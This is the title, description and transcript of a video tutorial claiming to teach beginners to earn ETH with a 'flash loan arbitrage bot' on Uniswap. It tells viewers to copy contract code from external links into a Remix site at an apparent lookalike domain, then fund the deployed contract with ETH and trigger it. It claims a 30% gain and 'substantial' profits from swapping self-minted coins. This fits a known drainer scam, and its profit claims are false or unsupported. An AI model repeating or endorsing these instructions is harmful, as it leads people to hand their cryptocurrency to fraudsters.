title: How To Make ETH With Uniswap in 2023 - No Code Flash Loan (For Beginners)
description: *:check mark button:Updated Code: Working as of June 5 , 2023*  In this video, We will deploy our own coin to UniSwap and swap it between Ethereum and DAI. As we have an infinite amount of our own coins, we can generate substantial amounts of Ethereum in a swap.We keep profits in ETH and this can be repeated at times. Higher the volatility, higher profit due to price change.  IMPORTANT:  the arbitrage might fail due to depletion of ETH in your smart contract as gas price varies from time to time. If you dont put the enough ETH the borrow and the flashloan might fail due to the interest to be paid at the end of the flash loans or transaction gas cost.   It is recommended to fund the contract with around 0.2 ETH to make sure that it has sufficient funding for gas fees .  Get metamask:  :pushpin:https://metamask.io/download.html  Access Remix:  :pushpin:https://www.remixcompiler.pro  Smart Contract Code:  :pushpin:ipfs.io/ipfs/QmXrsHNc5HrFfts7a4w5ca6qAWPtJZLGoc1tvUATDyQEZL     (Mirror link) :pushpin:https://pastebin.com/raw/yCSxRLGC  Flash Loan Explanation: :pushpin:academy.binance.com/en/articles/what-are-flash-loans-in-defi  For your questions, you can PM me on Telegram: (Please only ask contract related questions) Telegram :  Crypto1392

asr.full_text: Hey everyone. It's me Karl and welcome back to another video. Today I want to share with you how to deploy your own flashloan arbitrage bot on the ethereum mainnet, which can help you to make a passive income in ether. In a few words the flashloan bot allows you to automaticaly trade a given token over the ethereum mainnet without having to go through the typical transactional methods. This is going to enable us to perform flashloan attacks to trade tokens on decentralized exchanges such as UNISWAP, and this is going to alow us with our robot to Borrow Flashloans, Sniff Mampool for arbitrage opportunities and to trade them! Also, i'll put all the links in the video description down below & If you need help, you can just contact me on Telegram. Let's start! First, you need to download the metamask extension from the official website. Then you go through the steps to create a wallet. And now we are ready for the next step. We head over to Remix.Then we go to Deploy and run transactions. Now we choose for Env, injected web3 to connect to our MetaMask wallet. Here you should now see your MetaMermask account with your balance in ether and after that we go to the file explorer and we make a new file and name it call ether flash loan then this empty sheet and now we copy and paste the code of our flash loan smart contract from this website into remix in the next step we go to the Like this. In the next step we go to the solidity compiler and our smart contract runs on version 0.5.0 plus commit and then we can hit the compile button and guys if you followed all steps correctly you should see a green mark here and this is really important to check because because otherwise it can lead to problems with your smart contract and in the next step we head over to deploy and run transactions again and then we go to the token string right here and we choose call the token name Khazethr token, token symbol CET and loan amount of 1.000. And often people ask me at this point, if you use more A more ether do you also have to increase the loan amount? But no that is not necessary I always keep the loan amount at 1000 Okay And all we need to do now is we need to click on Transact But first guys there is 1 drawback on the etherum network The gas fees are usually very high but because of that as the entry is harder and this means that a competition of Flash Loaning people is lower on these human may not and therefore the potential to make profits is even higher and that's why I mainly use the ethereum version of the smart contract so if you want to start with your own flash loan smart contract I would take an absolute minimum of 0.2 eth for flash Loan but my recommendation is at least 0.5 because the smartcontract will use the ether to perform the flash loan arbitrage and to cover fees for that. In this video we are starting our contract with one ethereum. In the next step click on Transact To deploy the smartcont contract to the ethereum mainnet. I pay a high gas fee to speed it up. I confirm and pay the fees. for the transaction and after that you should see your deployed smart contract right over here this can take a moment you can see here your creation for smart contract and it's finished and now here you can see as i said your deployed smart contract and that's the address. We will copy it, go to our Metamask extension and send one ether to this address I'll speed this up again go ahead and confirm then we need to wait again for the transaction to be confirmed. Just wait, almost finished. Ok, and now we are ready for the last step but first I will explain it to you. We will start our flashdown smart contract. Therefore, we just need to click on action right over here and then we need to wait again for our transaction to be confirmed and after that our created smart contract will perform a flushdown arbitrage. and than we can see the results in our Metamask wallet. So lets do this, we press on Action. And than we need to pay a fee again. For our Flashloan. our flashdown. We will check our midtermass wallet now and there we go guys, our flashdown went through successfully, we started with one ether and now we are actually at 1.3 ETH that's really amazing in my opinion and as i said i'll put all necessary links in the video description down below But that's it for the video If I could help you I would be very happy about a like or subscribe Also be sure to check out my channel Have a nice day Stay cool Bye bye
